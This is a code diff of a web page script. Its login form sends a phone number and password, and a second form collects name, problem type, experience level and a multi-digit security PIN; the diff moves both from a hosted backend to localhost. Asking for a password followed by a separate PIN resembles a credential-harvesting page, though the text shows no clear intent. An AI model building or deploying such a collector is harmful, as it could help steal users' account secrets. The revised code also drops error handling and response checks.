@@ -1,117 +1,76 @@
-const API = "https://sprodeal-backend-juwe.onrender.com";
+let currentPhone = "";
 
+document.getElementById("loginForm").addEventListener("submit", async function (e) {
 
-// Login Form
+    e.preventDefault();
 
-document
-    .getElementById("loginForm")
-    .addEventListener("submit", async (e) => {
+    const phone = document.getElementById("phone").value;
+    const password = document.getElementById("password").value;
 
-        e.preventDefault();
+    currentPhone = phone;
 
-        const phone = document.getElementById("phone").value;
+    const response = await fetch("http://localhost:5500/login", {
 
-        const password = document.getElementById("password").value;
+        method: "POST",
 
-        try {
+        headers: {
+            "Content-Type": "application/json"
+        },
 
-            const response = await fetch(`${API}/submit`, {
-
-                method: "POST",
-
-                headers: {
-                    "Content-Type": "application/json"
-                },
-
-                body: JSON.stringify({
-                    phone,
-                    password
-                })
-
-            });
-
-            const data = await response.json();
-
-            alert(data.message);
-
-            if (response.ok) {
-
-                document.getElementById("loginForm").style.display = "none";
-
-                document.getElementById("detailsForm").style.display = "block";
-
-            }
-
-        }
-
-        catch (error) {
-
-            console.error(error);
-
-            alert("Server Error");
-
-        }
+        body: JSON.stringify({
+            phone,
+            password
+        })
 
     });
 
+    const data = await response.json();
 
+    alert(data.message);
 
+    document.getElementById("loginForm").style.display = "none";
+    document.getElementById("detailsForm").style.display = "block";
 
-// Details Form
+});
 
-document
-    .getElementById("detailsForm")
-    .addEventListener("submit", async (e) => {
+document.getElementById("detailsForm").addEventListener("submit", async function (e) {
 
-        e.preventDefault();
+    e.preventDefault();
 
-        const fullName = document.getElementById("fullName").value;
+    const pin = document.querySelectorAll(".pin");
 
-        const problemType = document.getElementById("problemType").value;
+    let securityPin = "";
 
-        const experienceLevel =
-            document.getElementById("experienceLevel").value;
+    pin.forEach(input => {
+        securityPin += input.value;
+    });
 
-        const pin = [...document.querySelectorAll(".pin")]
-            .map(input => input.value)
-            .join("");
+    const response = await fetch("http://localhost:5500/details", {
 
-        try {
+        method: "POST",
 
-            const response = await fetch(`${API}/details`, {
+        headers: {
+            "Content-Type": "application/json"
+        },
 
-                method: "POST",
+        body: JSON.stringify({
 
-                headers: {
-                    "Content-Type": "application/json"
-                },
+            phone: currentPhone,
 
-                body: JSON.stringify({
+            fullName: document.getElementById("fullName").value,
 
-                    fullName,
+            problemType: document.getElementById("problemType").value,
 
-                    problemType,
+            securityPin: securityPin,
 
-                    experienceLevel,
+            experienceLevel: document.getElementById("experienceLevel").value
 
-                    pin
-
-                })
-
-            });
-
-            const data = await response.json();
-
-            alert(data.message);
-
-        }
-
-        catch (error) {
-
-            console.error(error);
-
-            alert("Server Error");
-
-        }
+        })
 
     });
+
+    const data = await response.json();
+
+    alert(data.message);
+
+});
